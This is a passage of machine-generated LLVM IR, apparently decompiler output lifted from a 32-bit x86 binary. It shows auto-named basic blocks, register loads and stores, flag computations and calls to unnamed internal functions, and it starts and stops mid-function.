  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp148, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8054ab4.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8051f60()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80183, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp149, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb207, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp150, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp151, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
